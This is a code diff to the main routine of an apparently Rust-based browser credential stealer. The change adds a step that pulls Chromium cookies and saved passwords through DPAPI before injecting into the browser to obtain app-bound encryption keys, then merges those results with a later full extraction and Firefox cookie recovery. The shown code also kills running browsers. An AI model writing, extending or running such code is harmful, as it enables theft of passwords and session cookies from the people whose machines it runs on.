@@ -155,7 +155,10 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     // ── 3. Kill browsers already running ───────────────────────────────────────
     core::kill::kill_browsers();
 
-    // ── 4. Chromium inject (keys only, may spawn headless) ───────────────────
+    // ── 3b. Chromium cookies/passwords (DBs unlocked, DPAPI — before inject) ─
+    let chromium_pre = browsers::chromium::extract_pre_inject();
+
+    // ── 4. Chromium inject (upgrade app-bound keys in cache) ─────────────────
     let pids_before_inject = core::kill::snapshot_browser_pids();
     browsers::chromium::inject_and_cache_all();
 
@@ -167,9 +170,10 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     browsers::common::ci::cleanup_legacy_artifacts();
     core::kill::kill_browsers();
 
-    // ── 7. Cookie / profile recovery (DBs unlocked) ───────────────────────────
-    let chromium_files = browsers::chromium::extract_all_from_cache();
-    all_files.extend(chromium_files);
+    // ── 7. Full Chromium extract (v20) + merge pre-inject cookies ─────────────
+    let chromium_post = browsers::chromium::extract_all_from_cache();
+    all_files.extend(chromium_post);
+    browsers::merge_files(&mut all_files, chromium_pre);
     let gecko_cookie_retry = browsers::gecko::extract_cookies_post_kill();
     browsers::merge_files(&mut all_files, gecko_cookie_retry);
     browsers::common::zipp::sort_entries(&mut all_files);
